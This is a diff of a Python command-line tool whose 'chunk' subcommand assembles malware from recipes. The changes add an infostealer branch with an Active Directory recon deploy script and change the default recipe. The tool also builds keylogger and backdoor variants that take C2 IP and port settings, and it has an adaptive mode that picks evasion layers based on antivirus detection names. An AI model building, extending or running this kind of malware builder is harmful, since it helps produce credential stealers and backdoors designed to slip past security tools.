@@ -464,7 +464,7 @@ async def cmd_chunk(args) -> int:
         recipe_path.write_text(recipe_yaml)
         print(f"Adaptive recipe written to {recipe_path}")
     else:
-        recipe_name = getattr(args, "recipe", "infostealer_full")
+        recipe_name = getattr(args, "recipe", "ad_recon_default")
         candidate = Path(recipe_name)
         if candidate.is_absolute() and candidate.exists():
             recipe_path = candidate
@@ -515,6 +515,10 @@ async def cmd_chunk(args) -> int:
         deploy_script = Path(__file__).parent / "scripts" / "deploy_backdoor.sh"
         if deploy_script.exists():
             shutil.copy2(str(deploy_script), str(pkg_dir / "deploy.sh"))
+    elif malware_type == "infostealer":
+        deploy_script = Path(__file__).parent / "scripts" / "deploy_ad_recon.sh"
+        if deploy_script.exists():
+            shutil.copy2(str(deploy_script), str(pkg_dir / "deploy.sh"))
 
     build_info = (
         f"type: {malware_type}\n"
@@ -553,6 +557,8 @@ async def cmd_chunk(args) -> int:
             test_script = scripts_dir / "deploy_keylogger.sh"
         elif malware_type == "backdoor":
             test_script = scripts_dir / "deploy_backdoor.sh"
+        elif malware_type == "infostealer":
+            test_script = scripts_dir / "deploy_ad_recon.sh"
         else:
             test_script = scripts_dir / "test_template.sh"
         if not test_script.exists():
@@ -565,6 +571,8 @@ async def cmd_chunk(args) -> int:
                 cmd = ["bash", str(test_script), test_input, c2_port]
             elif malware_type == "backdoor":
                 cmd = ["bash", str(test_script), test_input, c2_ip, c2_port]
+            elif malware_type == "infostealer":
+                cmd = ["bash", str(test_script), test_input]
             else:
                 cmd = ["bash", str(test_script)]
                 if args.snapshot:
@@ -845,7 +853,7 @@ def build_parser() -> argparse.ArgumentParser:
         "chunk",
         help="Assemble malware from chunk recipes (no LLM needed)",
     )
-    chunk_parser.add_argument("--recipe", default="infostealer_full", help="Recipe name (default: infostealer_full)")
+    chunk_parser.add_argument("--recipe", default="ad_recon_default", help="Recipe name (default: ad_recon_default)")
     chunk_parser.add_argument("--adaptive", action="store_true", help="Use evasion_selector to pick layers adaptively")
     chunk_parser.add_argument("--type", default="infostealer", help="Malware type for adaptive mode (default: infostealer)")
     chunk_parser.add_argument("--detection", default="", help="Detection feedback for adaptive mode (e.g. 'Trojan:Win32/Stealer')")
